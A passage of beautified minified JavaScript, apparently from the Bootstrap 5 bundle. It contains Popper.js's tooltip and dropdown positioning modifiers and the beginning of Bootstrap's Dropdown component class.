                    do {
                        if (n && t.isSameNode(n)) return !0;
                        n = n.parentNode || n.host
                    } while (n)
                }
                return !1
            }
            function yt(t) {
                return dt(t).getComputedStyle(t)
            }
            function wt(t) {
                return ["table", "td", "th"].indexOf(ht(t)) >= 0
            }
            function Et(t) {
                return ((ut(t) ? t.ownerDocument : t.document) || window.document).documentElement
            }
            function At(t) {
                return "html" === ht(t) ? t : t.assignedSlot || t.parentNode || (pt(t) ? t.host : null) || Et(t)
            }
            function Tt(t) {
                return ft(t) && "fixed" !== yt(t).position ? t.offsetParent : null
            }
            function Ot(t) {
                for (var e = dt(t), i = Tt(t); i && wt(i) && "static" === yt(i).position;) i = Tt(i);
                return i && ("html" === ht(i) || "body" === ht(i) && "static" === yt(i).position) ? e : i || function (t) {
                    var e = -1 !== navigator.userAgent.toLowerCase().indexOf("firefox");
                    if (-1 !== navigator.userAgent.indexOf("Trident") && ft(t) && "fixed" === yt(t).position) return null;
                    for (var i = At(t); ft(i) && ["html", "body"].indexOf(ht(i)) < 0;) {
                        var n = yt(i);
                        if ("none" !== n.transform || "none" !== n.perspective || "paint" === n.contain || -1 !== ["transform", "perspective"].indexOf(n.willChange) || e && "filter" === n.willChange || e && n.filter && "none" !== n.filter) return i;
                        i = i.parentNode
                    }
                    return null
                }(t) || e
            }
            function Ct(t) {
                return ["top", "bottom"].indexOf(t) >= 0 ? "x" : "y"
            }
            var kt = Math.max,
                Lt = Math.min,
                xt = Math.round;
            function Dt(t, e, i) {
                return kt(t, Lt(e, i))
            }
            function St(t) {
                return Object.assign({}, {
                    top: 0,
                    right: 0,
                    bottom: 0,
                    left: 0
                }, t)
            }
            function It(t, e) {
                return e.reduce((function (e, i) {
                    return e[i] = t, e
                }), {})
            }
            var Nt = {
                name: "arrow",
                enabled: !0,
                phase: "main",
                fn: function (t) {
                    var e, i = t.state,
                        n = t.name,
                        s = t.options,
                        o = i.elements.arrow,
                        r = i.modifiersData.popperOffsets,
                        a = gt(i.placement),
                        l = Ct(a),
                        c = [ot, st].indexOf(a) >= 0 ? "height" : "width";
                    if (o && r) {
                        var h = function (t, e) {
                            return St("number" != typeof (t = "function" == typeof t ? t(Object.assign({}, e.rects, {
                                placement: e.placement
                            })) : t) ? t : It(t, rt))
                        }(s.padding, i),
                            d = bt(o),
                            u = "y" === l ? it : ot,
                            f = "y" === l ? nt : st,
                            p = i.rects.reference[c] + i.rects.reference[l] - r[l] - i.rects.popper[c],
                            m = r[l] - i.rects.reference[l],
                            g = Ot(o),
                            _ = g ? "y" === l ? g.clientHeight || 0 : g.clientWidth || 0 : 0,
                            b = p / 2 - m / 2,
                            v = h[u],
                            y = _ - d[c] - h[f],
                            w = _ / 2 - d[c] / 2 + b,
                            E = Dt(v, w, y),
                            A = l;
                        i.modifiersData[n] = ((e = {})[A] = E, e.centerOffset = E - w, e)
                    }
                },
                effect: function (t) {
                    var e = t.state,
                        i = t.options.element,
                        n = void 0 === i ? "[data-popper-arrow]" : i;
                    null != n && ("string" != typeof n || (n = e.elements.popper.querySelector(n))) && vt(e.elements.popper, n) && (e.elements.arrow = n)
                },
                requires: ["popperOffsets"],
                requiresIfExists: ["preventOverflow"]
            },
                jt = {
                    top: "auto",
                    right: "auto",
                    bottom: "auto",
                    left: "auto"
                };
            function Mt(t) {
                var e, i = t.popper,
                    n = t.popperRect,
                    s = t.placement,
                    o = t.offsets,
                    r = t.position,
                    a = t.gpuAcceleration,
                    l = t.adaptive,
                    c = t.roundOffsets,
                    h = !0 === c ? function (t) {
                        var e = t.x,
                            i = t.y,
                            n = window.devicePixelRatio || 1;
                        return {
                            x: xt(xt(e * n) / n) || 0,
                            y: xt(xt(i * n) / n) || 0
                        }
                    }(o) : "function" == typeof c ? c(o) : o,
                    d = h.x,
                    u = void 0 === d ? 0 : d,
                    f = h.y,
                    p = void 0 === f ? 0 : f,
                    m = o.hasOwnProperty("x"),
                    g = o.hasOwnProperty("y"),
                    _ = ot,
                    b = it,
                    v = window;
                if (l) {
                    var y = Ot(i),
                        w = "clientHeight",
                        E = "clientWidth";
                    y === dt(i) && "static" !== yt(y = Et(i)).position && (w = "scrollHeight", E = "scrollWidth"), y = y, s === it && (b = nt, p -= y[w] - n.height, p *= a ? 1 : -1), s === ot && (_ = st, u -= y[E] - n.width, u *= a ? 1 : -1)
                }
                var A, T = Object.assign({
                    position: r
                }, l && jt);
                return a ? Object.assign({}, T, ((A = {})[b] = g ? "0" : "", A[_] = m ? "0" : "", A.transform = (v.devicePixelRatio || 1) < 2 ? "translate(" + u + "px, " + p + "px)" : "translate3d(" + u + "px, " + p + "px, 0)", A)) : Object.assign({}, T, ((e = {})[b] = g ? p + "px" : "", e[_] = m ? u + "px" : "", e.transform = "", e))
            }
            var Pt = {
                name: "computeStyles",
                enabled: !0,
                phase: "beforeWrite",
                fn: function (t) {
                    var e = t.state,
                        i = t.options,
                        n = i.gpuAcceleration,
                        s = void 0 === n || n,
                        o = i.adaptive,
                        r = void 0 === o || o,
                        a = i.roundOffsets,
                        l = void 0 === a || a,
                        c = {
                            placement: gt(e.placement),
                            popper: e.elements.popper,
                            popperRect: e.rects.popper,
                            gpuAcceleration: s
                        };
                    null != e.modifiersData.popperOffsets && (e.styles.popper = Object.assign({}, e.styles.popper, Mt(Object.assign({}, c, {
                        offsets: e.modifiersData.popperOffsets,
                        position: e.options.strategy,
                        adaptive: r,
                        roundOffsets: l
                    })))), null != e.modifiersData.arrow && (e.styles.arrow = Object.assign({}, e.styles.arrow, Mt(Object.assign({}, c, {
                        offsets: e.modifiersData.arrow,
                        position: "absolute",
                        adaptive: !1,
                        roundOffsets: l
                    })))), e.attributes.popper = Object.assign({}, e.attributes.popper, {
                        "data-popper-placement": e.placement
                    })
                },
                data: {}
            },
                Ht = {
                    passive: !0
                },
                Rt = {
                    name: "eventListeners",
                    enabled: !0,
                    phase: "write",
                    fn: function () { },
                    effect: function (t) {
                        var e = t.state,
                            i = t.instance,
                            n = t.options,
                            s = n.scroll,
                            o = void 0 === s || s,
                            r = n.resize,
                            a = void 0 === r || r,
                            l = dt(e.elements.popper),
                            c = [].concat(e.scrollParents.reference, e.scrollParents.popper);
                        return o && c.forEach((function (t) {
                            t.addEventListener("scroll", i.update, Ht)
                        })), a && l.addEventListener("resize", i.update, Ht),
                            function () {
                                o && c.forEach((function (t) {
                                    t.removeEventListener("scroll", i.update, Ht)
                                })), a && l.removeEventListener("resize", i.update, Ht)
                            }
                    },
                    data: {}
                },
                Bt = {
                    left: "right",
                    right: "left",
                    bottom: "top",
                    top: "bottom"
                };
            function Wt(t) {
                return t.replace(/left|right|bottom|top/g, (function (t) {
                    return Bt[t]
                }))
            }
            var qt = {
                start: "end",
                end: "start"
            };
            function zt(t) {
                return t.replace(/start|end/g, (function (t) {
                    return qt[t]
                }))
            }
            function $t(t) {
                var e = dt(t);
                return {
                    scrollLeft: e.pageXOffset,
                    scrollTop: e.pageYOffset
                }
            }
            function Ut(t) {
                return _t(Et(t)).left + $t(t).scrollLeft
            }
            function Ft(t) {
                var e = yt(t),
                    i = e.overflow,
                    n = e.overflowX,
                    s = e.overflowY;
                return /auto|scroll|overlay|hidden/.test(i + s + n)
            }
            function Vt(t, e) {
                var i;
                void 0 === e && (e = []);
                var n = function t(e) {
                    return ["html", "body", "#document"].indexOf(ht(e)) >= 0 ? e.ownerDocument.body : ft(e) && Ft(e) ? e : t(At(e))
                }(t),
                    s = n === (null == (i = t.ownerDocument) ? void 0 : i.body),
                    o = dt(n),
                    r = s ? [o].concat(o.visualViewport || [], Ft(n) ? n : []) : n,
                    a = e.concat(r);
                return s ? a : a.concat(Vt(At(r)))
            }
            function Kt(t) {
                return Object.assign({}, t, {
                    left: t.x,
                    top: t.y,
                    right: t.x + t.width,
                    bottom: t.y + t.height
                })
            }
            function Xt(t, e) {
                return "viewport" === e ? Kt(function (t) {
                    var e = dt(t),
                        i = Et(t),
                        n = e.visualViewport,
                        s = i.clientWidth,
                        o = i.clientHeight,
                        r = 0,
                        a = 0;
                    return n && (s = n.width, o = n.height, /^((?!chrome|android).)*safari/i.test(navigator.userAgent) || (r = n.offsetLeft, a = n.offsetTop)), {
                        width: s,
                        height: o,
                        x: r + Ut(t),
                        y: a
                    }
                }(t)) : ft(e) ? function (t) {
                    var e = _t(t);
                    return e.top = e.top + t.clientTop, e.left = e.left + t.clientLeft, e.bottom = e.top + t.clientHeight, e.right = e.left + t.clientWidth, e.width = t.clientWidth, e.height = t.clientHeight, e.x = e.left, e.y = e.top, e
                }(e) : Kt(function (t) {
                    var e, i = Et(t),
                        n = $t(t),
                        s = null == (e = t.ownerDocument) ? void 0 : e.body,
                        o = kt(i.scrollWidth, i.clientWidth, s ? s.scrollWidth : 0, s ? s.clientWidth : 0),
                        r = kt(i.scrollHeight, i.clientHeight, s ? s.scrollHeight : 0, s ? s.clientHeight : 0),
                        a = -n.scrollLeft + Ut(t),
                        l = -n.scrollTop;
                    return "rtl" === yt(s || i).direction && (a += kt(i.clientWidth, s ? s.clientWidth : 0) - o), {
                        width: o,
                        height: r,
                        x: a,
                        y: l
                    }
                }(Et(t)))
            }
            function Yt(t) {
                return t.split("-")[1]
            }
            function Qt(t) {
                var e, i = t.reference,
                    n = t.element,
                    s = t.placement,
                    o = s ? gt(s) : null,
                    r = s ? Yt(s) : null,
                    a = i.x + i.width / 2 - n.width / 2,
                    l = i.y + i.height / 2 - n.height / 2;
                switch (o) {
                    case it:
                        e = {
                            x: a,
                            y: i.y - n.height
                        };
                        break;
                    case nt:
                        e = {
                            x: a,
                            y: i.y + i.height
                        };
                        break;
                    case st:
                        e = {
                            x: i.x + i.width,
                            y: l
                        };
                        break;
                    case ot:
                        e = {
                            x: i.x - n.width,
                            y: l
                        };
                        break;
                    default:
                        e = {
                            x: i.x,
                            y: i.y
                        }
                }
                var c = o ? Ct(o) : null;
                if (null != c) {
                    var h = "y" === c ? "height" : "width";
                    switch (r) {
                        case "start":
                            e[c] = e[c] - (i[h] / 2 - n[h] / 2);
                            break;
                        case "end":
                            e[c] = e[c] + (i[h] / 2 - n[h] / 2)
                    }
                }
                return e
            }
            function Gt(t, e) {
                void 0 === e && (e = {});
                var i = e,
                    n = i.placement,
                    s = void 0 === n ? t.placement : n,
                    o = i.boundary,
                    r = void 0 === o ? "clippingParents" : o,
                    a = i.rootBoundary,
                    l = void 0 === a ? "viewport" : a,
                    c = i.elementContext,
                    h = void 0 === c ? "popper" : c,
                    d = i.altBoundary,
                    u = void 0 !== d && d,
                    f = i.padding,
                    p = void 0 === f ? 0 : f,
                    m = St("number" != typeof p ? p : It(p, rt)),
                    g = "popper" === h ? "reference" : "popper",
                    _ = t.elements.reference,
                    b = t.rects.popper,
                    v = t.elements[u ? g : h],
                    y = function (t, e, i) {
                        var n = "clippingParents" === e ? function (t) {
                            var e = Vt(At(t)),
                                i = ["absolute", "fixed"].indexOf(yt(t).position) >= 0 && ft(t) ? Ot(t) : t;
                            return ut(i) ? e.filter((function (t) {
                                return ut(t) && vt(t, i) && "body" !== ht(t)
                            })) : []
                        }(t) : [].concat(e),
                            s = [].concat(n, [i]),
                            o = s[0],
                            r = s.reduce((function (e, i) {
                                var n = Xt(t, i);
                                return e.top = kt(n.top, e.top), e.right = Lt(n.right, e.right), e.bottom = Lt(n.bottom, e.bottom), e.left = kt(n.left, e.left), e
                            }), Xt(t, o));
                        return r.width = r.right - r.left, r.height = r.bottom - r.top, r.x = r.left, r.y = r.top, r
                    }(ut(v) ? v : v.contextElement || Et(t.elements.popper), r, l),
                    w = _t(_),
                    E = Qt({
                        reference: w,
                        element: b,
                        strategy: "absolute",
                        placement: s
                    }),
                    A = Kt(Object.assign({}, b, E)),
                    T = "popper" === h ? A : w,
                    O = {
                        top: y.top - T.top + m.top,
                        bottom: T.bottom - y.bottom + m.bottom,
                        left: y.left - T.left + m.left,
                        right: T.right - y.right + m.right
                    },
                    C = t.modifiersData.offset;
                if ("popper" === h && C) {
                    var k = C[s];
                    Object.keys(O).forEach((function (t) {
                        var e = [st, nt].indexOf(t) >= 0 ? 1 : -1,
                            i = [it, nt].indexOf(t) >= 0 ? "y" : "x";
                        O[t] += k[i] * e
                    }))
                }
                return O
            }
            function Zt(t, e) {
                void 0 === e && (e = {});
                var i = e,
                    n = i.placement,
                    s = i.boundary,
                    o = i.rootBoundary,
                    r = i.padding,
                    a = i.flipVariations,
                    l = i.allowedAutoPlacements,
                    c = void 0 === l ? lt : l,
                    h = Yt(n),
                    d = h ? a ? at : at.filter((function (t) {
                        return Yt(t) === h
                    })) : rt,
                    u = d.filter((function (t) {
                        return c.indexOf(t) >= 0
                    }));
                0 === u.length && (u = d);
                var f = u.reduce((function (e, i) {
                    return e[i] = Gt(t, {
                        placement: i,
                        boundary: s,
                        rootBoundary: o,
                        padding: r
                    })[gt(i)], e
                }), {});
                return Object.keys(f).sort((function (t, e) {
                    return f[t] - f[e]
                }))
            }
            var Jt = {
                name: "flip",
                enabled: !0,
                phase: "main",
                fn: function (t) {
                    var e = t.state,
                        i = t.options,
                        n = t.name;
                    if (!e.modifiersData[n]._skip) {
                        for (var s = i.mainAxis, o = void 0 === s || s, r = i.altAxis, a = void 0 === r || r, l = i.fallbackPlacements, c = i.padding, h = i.boundary, d = i.rootBoundary, u = i.altBoundary, f = i.flipVariations, p = void 0 === f || f, m = i.allowedAutoPlacements, g = e.options.placement, _ = gt(g), b = l || (_ !== g && p ? function (t) {
                            if ("auto" === gt(t)) return [];
                            var e = Wt(t);
                            return [zt(t), e, zt(e)]
                        }(g) : [Wt(g)]), v = [g].concat(b).reduce((function (t, i) {
                            return t.concat("auto" === gt(i) ? Zt(e, {
                                placement: i,
                                boundary: h,
                                rootBoundary: d,
                                padding: c,
                                flipVariations: p,
                                allowedAutoPlacements: m
                            }) : i)
                        }), []), y = e.rects.reference, w = e.rects.popper, E = new Map, A = !0, T = v[0], O = 0; O < v.length; O++) {
                            var C = v[O],
                                k = gt(C),
                                L = "start" === Yt(C),
                                x = [it, nt].indexOf(k) >= 0,
                                D = x ? "width" : "height",
                                S = Gt(e, {
                                    placement: C,
                                    boundary: h,
                                    rootBoundary: d,
                                    altBoundary: u,
                                    padding: c
                                }),
                                I = x ? L ? st : ot : L ? nt : it;
                            y[D] > w[D] && (I = Wt(I));
                            var N = Wt(I),
                                j = [];
                            if (o && j.push(S[k] <= 0), a && j.push(S[I] <= 0, S[N] <= 0), j.every((function (t) {
                                return t
                            }))) {
                                T = C, A = !1;
                                break
                            }
                            E.set(C, j)
                        }
                        if (A)
                            for (var M = function (t) {
                                var e = v.find((function (e) {
                                    var i = E.get(e);
                                    if (i) return i.slice(0, t).every((function (t) {
                                        return t
                                    }))
                                }));
                                if (e) return T = e, "break"
                            }, P = p ? 3 : 1; P > 0 && "break" !== M(P); P--);
                        e.placement !== T && (e.modifiersData[n]._skip = !0, e.placement = T, e.reset = !0)
                    }
                },
                requiresIfExists: ["offset"],
                data: {
                    _skip: !1
                }
            };
            function te(t, e, i) {
                return void 0 === i && (i = {
                    x: 0,
                    y: 0
                }), {
                    top: t.top - e.height - i.y,
                    right: t.right - e.width + i.x,
                    bottom: t.bottom - e.height + i.y,
                    left: t.left - e.width - i.x
                }
            }
            function ee(t) {
                return [it, st, nt, ot].some((function (e) {
                    return t[e] >= 0
                }))
            }
            var ie = {
                name: "hide",
                enabled: !0,
                phase: "main",
                requiresIfExists: ["preventOverflow"],
                fn: function (t) {
                    var e = t.state,
                        i = t.name,
                        n = e.rects.reference,
                        s = e.rects.popper,
                        o = e.modifiersData.preventOverflow,
                        r = Gt(e, {
                            elementContext: "reference"
                        }),
                        a = Gt(e, {
                            altBoundary: !0
                        }),
                        l = te(r, n),
                        c = te(a, s, o),
                        h = ee(l),
                        d = ee(c);
                    e.modifiersData[i] = {
                        referenceClippingOffsets: l,
                        popperEscapeOffsets: c,
                        isReferenceHidden: h,
                        hasPopperEscaped: d
                    }, e.attributes.popper = Object.assign({}, e.attributes.popper, {
                        "data-popper-reference-hidden": h,
                        "data-popper-escaped": d
                    })
                }
            },
                ne = {
                    name: "offset",
                    enabled: !0,
                    phase: "main",
                    requires: ["popperOffsets"],
                    fn: function (t) {
                        var e = t.state,
                            i = t.options,
                            n = t.name,
                            s = i.offset,
                            o = void 0 === s ? [0, 0] : s,
                            r = lt.reduce((function (t, i) {
                                return t[i] = function (t, e, i) {
                                    var n = gt(t),
                                        s = [ot, it].indexOf(n) >= 0 ? -1 : 1,
                                        o = "function" == typeof i ? i(Object.assign({}, e, {
                                            placement: t
                                        })) : i,
                                        r = o[0],
                                        a = o[1];
                                    return r = r || 0, a = (a || 0) * s, [ot, st].indexOf(n) >= 0 ? {
                                        x: a,
                                        y: r
                                    } : {
                                        x: r,
                                        y: a
                                    }
                                }(i, e.rects, o), t
                            }), {}),
                            a = r[e.placement],
                            l = a.x,
                            c = a.y;
                        null != e.modifiersData.popperOffsets && (e.modifiersData.popperOffsets.x += l, e.modifiersData.popperOffsets.y += c), e.modifiersData[n] = r
                    }
                },
                se = {
                    name: "popperOffsets",
                    enabled: !0,
                    phase: "read",
                    fn: function (t) {
                        var e = t.state,
                            i = t.name;
                        e.modifiersData[i] = Qt({
                            reference: e.rects.reference,
                            element: e.rects.popper,
                            strategy: "absolute",
                            placement: e.placement
                        })
                    },
                    data: {}
                },
                oe = {
                    name: "preventOverflow",
                    enabled: !0,
                    phase: "main",
                    fn: function (t) {
                        var e = t.state,
                            i = t.options,
                            n = t.name,
                            s = i.mainAxis,
                            o = void 0 === s || s,
                            r = i.altAxis,
                            a = void 0 !== r && r,
                            l = i.boundary,
                            c = i.rootBoundary,
                            h = i.altBoundary,
                            d = i.padding,
                            u = i.tether,
                            f = void 0 === u || u,
                            p = i.tetherOffset,
                            m = void 0 === p ? 0 : p,
                            g = Gt(e, {
                                boundary: l,
                                rootBoundary: c,
                                padding: d,
                                altBoundary: h
                            }),
                            _ = gt(e.placement),
                            b = Yt(e.placement),
                            v = !b,
                            y = Ct(_),
                            w = "x" === y ? "y" : "x",
                            E = e.modifiersData.popperOffsets,
                            A = e.rects.reference,
                            T = e.rects.popper,
                            O = "function" == typeof m ? m(Object.assign({}, e.rects, {
                                placement: e.placement
                            })) : m,
                            C = {
                                x: 0,
                                y: 0
                            };
                        if (E) {
                            if (o || a) {
                                var k = "y" === y ? it : ot,
                                    L = "y" === y ? nt : st,
                                    x = "y" === y ? "height" : "width",
                                    D = E[y],
                                    S = E[y] + g[k],
                                    I = E[y] - g[L],
                                    N = f ? -T[x] / 2 : 0,
                                    j = "start" === b ? A[x] : T[x],
                                    M = "start" === b ? -T[x] : -A[x],
                                    P = e.elements.arrow,
                                    H = f && P ? bt(P) : {
                                        width: 0,
                                        height: 0
                                    },
                                    R = e.modifiersData["arrow#persistent"] ? e.modifiersData["arrow#persistent"].padding : {
                                        top: 0,
                                        right: 0,
                                        bottom: 0,
                                        left: 0
                                    },
                                    B = R[k],
                                    W = R[L],
                                    q = Dt(0, A[x], H[x]),
                                    z = v ? A[x] / 2 - N - q - B - O : j - q - B - O,
                                    $ = v ? -A[x] / 2 + N + q + W + O : M + q + W + O,
                                    U = e.elements.arrow && Ot(e.elements.arrow),
                                    F = U ? "y" === y ? U.clientTop || 0 : U.clientLeft || 0 : 0,
                                    V = e.modifiersData.offset ? e.modifiersData.offset[e.placement][y] : 0,
                                    K = E[y] + z - V - F,
                                    X = E[y] + $ - V;
                                if (o) {
                                    var Y = Dt(f ? Lt(S, K) : S, D, f ? kt(I, X) : I);
                                    E[y] = Y, C[y] = Y - D
                                }
                                if (a) {
                                    var Q = "x" === y ? it : ot,
                                        G = "x" === y ? nt : st,
                                        Z = E[w],
                                        J = Z + g[Q],
                                        tt = Z - g[G],
                                        et = Dt(f ? Lt(J, K) : J, Z, f ? kt(tt, X) : tt);
                                    E[w] = et, C[w] = et - Z
                                }
                            }
                            e.modifiersData[n] = C
                        }
                    },
                    requiresIfExists: ["offset"]
                };
            function re(t, e, i) {
                void 0 === i && (i = !1);
                var n, s, o = Et(e),
                    r = _t(t),
                    a = ft(e),
                    l = {
                        scrollLeft: 0,
                        scrollTop: 0
                    },
                    c = {
                        x: 0,
                        y: 0
                    };
                return (a || !a && !i) && (("body" !== ht(e) || Ft(o)) && (l = (n = e) !== dt(n) && ft(n) ? {
                    scrollLeft: (s = n).scrollLeft,
                    scrollTop: s.scrollTop
                } : $t(n)), ft(e) ? ((c = _t(e)).x += e.clientLeft, c.y += e.clientTop) : o && (c.x = Ut(o))), {
                    x: r.left + l.scrollLeft - c.x,
                    y: r.top + l.scrollTop - c.y,
                    width: r.width,
                    height: r.height
                }
            }
            var ae = {
                placement: "bottom",
                modifiers: [],
                strategy: "absolute"
            };
            function le() {
                for (var t = arguments.length, e = new Array(t), i = 0; i < t; i++) e[i] = arguments[i];
                return !e.some((function (t) {
                    return !(t && "function" == typeof t.getBoundingClientRect)
                }))
            }
            function ce(t) {
                void 0 === t && (t = {});
                var e = t,
                    i = e.defaultModifiers,
                    n = void 0 === i ? [] : i,
                    s = e.defaultOptions,
                    o = void 0 === s ? ae : s;
                return function (t, e, i) {
                    void 0 === i && (i = o);
                    var s, r, a = {
                        placement: "bottom",
                        orderedModifiers: [],
                        options: Object.assign({}, ae, o),
                        modifiersData: {},
                        elements: {
                            reference: t,
                            popper: e
                        },
                        attributes: {},
                        styles: {}
                    },
                        l = [],
                        c = !1,
                        h = {
                            state: a,
                            setOptions: function (i) {
                                d(), a.options = Object.assign({}, o, a.options, i), a.scrollParents = {
                                    reference: ut(t) ? Vt(t) : t.contextElement ? Vt(t.contextElement) : [],
                                    popper: Vt(e)
                                };
                                var s, r, c = function (t) {
                                    var e = function (t) {
                                        var e = new Map,
                                            i = new Set,
                                            n = [];
                                        return t.forEach((function (t) {
                                            e.set(t.name, t)
                                        })), t.forEach((function (t) {
                                            i.has(t.name) || function t(s) {
                                                i.add(s.name), [].concat(s.requires || [], s.requiresIfExists || []).forEach((function (n) {
                                                    if (!i.has(n)) {
                                                        var s = e.get(n);
                                                        s && t(s)
                                                    }
                                                })), n.push(s)
                                            }(t)
                                        })), n
                                    }(t);
                                    return ct.reduce((function (t, i) {
                                        return t.concat(e.filter((function (t) {
                                            return t.phase === i
                                        })))
                                    }), [])
                                }((s = [].concat(n, a.options.modifiers), r = s.reduce((function (t, e) {
                                    var i = t[e.name];
                                    return t[e.name] = i ? Object.assign({}, i, e, {
                                        options: Object.assign({}, i.options, e.options),
                                        data: Object.assign({}, i.data, e.data)
                                    }) : e, t
                                }), {}), Object.keys(r).map((function (t) {
                                    return r[t]
                                }))));
                                return a.orderedModifiers = c.filter((function (t) {
                                    return t.enabled
                                })), a.orderedModifiers.forEach((function (t) {
                                    var e = t.name,
                                        i = t.options,
                                        n = void 0 === i ? {} : i,
                                        s = t.effect;
                                    if ("function" == typeof s) {
                                        var o = s({
                                            state: a,
                                            name: e,
                                            instance: h,
                                            options: n
                                        });
                                        l.push(o || function () { })
                                    }
                                })), h.update()
                            },
                            forceUpdate: function () {
                                if (!c) {
                                    var t = a.elements,
                                        e = t.reference,
                                        i = t.popper;
                                    if (le(e, i)) {
                                        a.rects = {
                                            reference: re(e, Ot(i), "fixed" === a.options.strategy),
                                            popper: bt(i)
                                        }, a.reset = !1, a.placement = a.options.placement, a.orderedModifiers.forEach((function (t) {
                                            return a.modifiersData[t.name] = Object.assign({}, t.data)
                                        }));
                                        for (var n = 0; n < a.orderedModifiers.length; n++)
                                            if (!0 !== a.reset) {
                                                var s = a.orderedModifiers[n],
                                                    o = s.fn,
                                                    r = s.options,
                                                    l = void 0 === r ? {} : r,
                                                    d = s.name;
                                                "function" == typeof o && (a = o({
                                                    state: a,
                                                    options: l,
                                                    name: d,
                                                    instance: h
                                                }) || a)
                                            } else a.reset = !1, n = -1
                                    }
                                }
                            },
                            update: (s = function () {
                                return new Promise((function (t) {
                                    h.forceUpdate(), t(a)
                                }))
                            }, function () {
                                return r || (r = new Promise((function (t) {
                                    Promise.resolve().then((function () {
                                        r = void 0, t(s())
                                    }))
                                }))), r
                            }),
                            destroy: function () {
                                d(), c = !0
                            }
                        };
                    if (!le(t, e)) return h;
                    function d() {
                        l.forEach((function (t) {
                            return t()
                        })), l = []
                    }
                    return h.setOptions(i).then((function (t) {
                        !c && i.onFirstUpdate && i.onFirstUpdate(t)
                    })), h
                }
            }
            var he = ce(),
                de = ce({
                    defaultModifiers: [Rt, se, Pt, mt]
                }),
                ue = ce({
                    defaultModifiers: [Rt, se, Pt, mt, ne, Jt, oe, Nt, ie]
                }),
                fe = Object.freeze({
                    __proto__: null,
                    popperGenerator: ce,
                    detectOverflow: Gt,
                    createPopperBase: he,
                    createPopper: ue,
                    createPopperLite: de,
                    top: it,
                    bottom: nt,
                    right: st,
                    left: ot,
                    auto: "auto",
                    basePlacements: rt,
                    start: "start",
                    end: "end",
                    clippingParents: "clippingParents",
                    viewport: "viewport",
                    popper: "popper",
                    reference: "reference",
                    variationPlacements: at,
                    placements: lt,
                    beforeRead: "beforeRead",
                    read: "read",
                    afterRead: "afterRead",
                    beforeMain: "beforeMain",
                    main: "main",
                    afterMain: "afterMain",
                    beforeWrite: "beforeWrite",
                    write: "write",
                    afterWrite: "afterWrite",
                    modifierPhases: ct,
                    applyStyles: mt,
                    arrow: Nt,
                    computeStyles: Pt,
                    eventListeners: Rt,
                    flip: Jt,
                    hide: ie,
                    offset: ne,
                    popperOffsets: se,
                    preventOverflow: oe
                });
            const pe = new RegExp("ArrowUp|ArrowDown|Escape"),
                me = g() ? "top-end" : "top-start",
                ge = g() ? "top-start" : "top-end",
                _e = g() ? "bottom-end" : "bottom-start",
                be = g() ? "bottom-start" : "bottom-end",
                ve = g() ? "left-start" : "right-start",
                ye = g() ? "right-start" : "left-start",
                we = {
                    offset: [0, 2],
                    boundary: "clippingParents",
                    reference: "toggle",
                    display: "dynamic",
                    popperConfig: null,
                    autoClose: !0
                },
                Ee = {
                    offset: "(array|string|function)",
                    boundary: "(string|element)",
                    reference: "(string|element|object)",
                    display: "string",
                    popperConfig: "(null|object|function)",
                    autoClose: "(boolean|string)"
                };
            class Ae extends B {
                constructor(t, e) {
                    super(t), this._popper = null, this._config = this._getConfig(e), this._menu = this._getMenuElement(), this._inNavbar = this._detectNavbar(), this._addEventListeners()
                }
                static get Default() {
                    return we
                }
                static get DefaultType() {
                    return Ee
                }
                static get NAME() {
                    return "dropdown"
                }
                toggle() {
                    h(this._element) || (this._element.classList.contains("show") ? this.hide() : this.show())
                }
                show() {
                    if (h(this._element) || this._menu.classList.contains("show")) return;
                    const t = Ae.getParentFromElement(this._element),
                        e = {
                            relatedTarget: this._element
                        };
                    if (!P.trigger(this._element, "show.bs.dropdown", e).defaultPrevented) {
                        if (this._inNavbar) U.setDataAttribute(this._menu, "popper", "none");
                        else {
                            if (void 0 === fe) throw new TypeError("Bootstrap's dropdowns require Popper (https://popper.js.org)");
                            let e = this._element;
                            "parent" === this._config.reference ? e = t : r(this._config.reference) ? e = a(this._config.reference) : "object" == typeof this._config.reference && (e = this._config.reference);
                            const i = this._getPopperConfig(),
                                n = i.modifiers.find(t => "applyStyles" === t.name && !1 === t.enabled);
                            this._popper = ue(e, this._menu, i), n && U.setDataAttribute(this._menu, "popper", "static")
                        }
                        "ontouchstart" in document.documentElement && !t.closest(".navbar-nav") && [].concat(...document.body.children).forEach(t => P.on(t, "mouseover", u)), this._element.focus(), this._element.setAttribute("aria-expanded", !0), this._menu.classList.toggle("show"), this._element.classList.toggle("show"), P.trigger(this._element, "shown.bs.dropdown", e)
                    }
                }
                hide() {
                    if (h(this._element) || !this._menu.classList.contains("show")) return;
                    const t = {
                        relatedTarget: this._element
                    };
                    this._completeHide(t)
                }
                dispose() {
                    this._popper && this._popper.destroy(), super.dispose()
                }
                update() {
                    this._inNavbar = this._detectNavbar(), this._popper && this._popper.update()
                }
                _addEventListeners() {
                    P.on(this._element, "click.bs.dropdown", t => {
                        t.preventDefault(), this.toggle()
                    })
                }
                _completeHide(t) {
                    P.trigger(this._element, "hide.bs.dropdown", t).defaultPrevented || ("ontouchstart" in document.documentElement && [].concat(...document.body.children).forEach(t => P.off(t, "mouseover", u)), this._popper && this._popper.destroy(), this._menu.classList.remove("show"), this._element.classList.remove("show"), this._element.setAttribute("aria-expanded", "false"), U.removeDataAttribute(this._menu, "popper"), P.trigger(this._element, "hidden.bs.dropdown", t))
                }
                _getConfig(t) {
                    if (t = {
                        ...this.constructor.Default,
                        ...U.getDataAttributes(this._element),
                        ...t
                    }, l("dropdown", t, this.constructor.DefaultType), "object" == typeof t.reference && !r(t.reference) && "function" != typeof t.reference.getBoundingClientRect) throw new TypeError("dropdown".toUpperCase() + ': Option "reference" provided type "object" without a required "getBoundingClientRect" method.');
                    return t
                }
                _getMenuElement() {
                    return t.next(this._element, ".dropdown-menu")[0]
                }
                _getPlacement() {
                    const t = this._element.parentNode;
                    if (t.classList.contains("dropend")) return ve;
                    if (t.classList.contains("dropstart")) return ye;
                    const e = "end" === getComputedStyle(this._menu).getPropertyValue("--bs-position").trim();
                    return t.classList.contains("dropup") ? e ? ge : me : e ? be : _e
                }
                _detectNavbar() {
                    return null !== this._element.closest(".navbar")
                }
                _getOffset() {
                    const {
                        offset: t
                    } = this._config;
                    return "string" == typeof t ? t.split(",").map(t => Number.parseInt(t, 10)) : "function" == typeof t ? e => t(e, this._element) : t
                }
                _getPopperConfig() {
                    const t = {
                        placement: this._getPlacement(),
                        modifiers: [{
                            name: "preventOverflow",
                            options: {
                                boundary: this._config.boundary
                            }
                        }, {
                            name: "offset",
                            options: {
                                offset: this._getOffset()
                            }
                        }]
                    };
                    return "static" === this._config.display && (t.modifiers = [{
                        name: "applyStyles",
